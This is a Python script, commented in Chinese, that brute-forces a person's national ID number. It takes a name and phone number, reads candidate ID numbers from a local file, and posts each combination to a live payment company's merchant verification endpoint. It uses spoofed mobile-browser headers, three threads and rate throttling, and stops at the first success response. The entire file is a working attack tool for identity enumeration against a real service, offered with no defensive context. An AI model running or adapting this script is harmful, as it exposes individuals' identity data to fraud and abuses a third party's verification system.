import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
import time

# 全局停止标志和锁
stop_event = threading.Event()
print_lock = threading.Lock()

# 输入基本信息
manager = input('请输入姓名: ')
tel = input('请输入手机号: ')

# 固定身份证文件路径
id_file = 'sfz.txt'

# 读取身份证号文件
try:
    with open(id_file, 'r', encoding='utf-8') as f:
        id_list = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"错误: 找不到文件 '{id_file}'")
    exit(1)
except Exception as e:
    print(f"读取文件错误: {e}")
    exit(1)

url = "https://ocbj.globebill.com/merchant/verifyCode"
headers = {
    "Host": "ocbj.globebill.com",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Origin": "https://ocbj.globebill.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.4 Mobile/23E246 Safari/604.1",
    "Referer": "https://ocbj.globebill.com/cancelMerchantH5/html/logout.html",
    "Sec-Fetch-Dest": "empty",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive"
}

REQUEST_DELAY = 0.5
last_request_time = 0
time_lock = threading.Lock()

def verify_id(idNo, index, total):
    """核验单个身份证号"""
    if stop_event.is_set():
        return None
    
    with time_lock:
        global last_request_time
        elapsed = time.time() - last_request_time
        if elapsed < REQUEST_DELAY:
            time.sleep(REQUEST_DELAY - elapsed)
        last_request_time = time.time()
    
    payload = {
        "idNo": idNo,
        "tel": tel,
        "manager": manager
    }
    
    result = {
        'index': index,
        'idNo': idNo,
        'success': False,
        'result_str': f"{manager}-{idNo}-{tel}-🔴",
        'raw_response': None,
        'error': None
    }
    
    try:
        res = requests.post(url, headers=headers, json=payload, timeout=10)
        raw_text = res.text.strip()  # 去除首尾空白
        
        # 只保留原始响应的前100字符，避免打印太多
        result['raw_response'] = raw_text[:100] + "..." if len(raw_text) > 100 else raw_text
        
        # 判断是否完全等于目标响应
        if raw_text == '{"returnCode":"0000","returnMessage":"成功"}':
            result['success'] = True
            result['result_str'] = f"{manager}-{idNo}-{tel}-🟢"
            stop_event.set()
        
    except requests.exceptions.Timeout:
        result['error'] = "请求超时"
    except requests.exceptions.RequestException as e:
        result['error'] = f"请求异常: {str(e)}"
    except Exception as e:
        result['error'] = f"未知错误: {str(e)}"
    
    return result

success_result = None
completed_count = 0

with ThreadPoolExecutor(max_workers=3) as executor:
    pending_futures = {
        executor.submit(verify_id, idNo, i+1, len(id_list)): idNo
        for i, idNo in enumerate(id_list)
    }
    
    for future in as_completed(pending_futures):
        if success_result is not None:
            break
            
        completed_count += 1
        result = future.result()
        
        if result is None:
            continue
        
        with print_lock:
            print(f"[{completed_count}/{len(id_list)}] 身份证: {result['idNo']}")
            if result['error']:
                print(f"    错误: {result['error']}")
            
            if result['success']:
                print(f"    ✅ {result['result_str']}")
                success_result = result
                stop_event.set()
                for f in pending_futures:
                    if not f.done():
                        f.cancel()
                break
            else:
                print(f"    ❌ {result['result_str']}")

time.sleep(1)

print("\n" + "=" * 60)
if success_result:
    print(f"🎉 核验成功: {success_result['result_str']}")
else:
    print("🔴 全部核验失败")
    print(f"已完成: {completed_count}/{len(id_list)}")
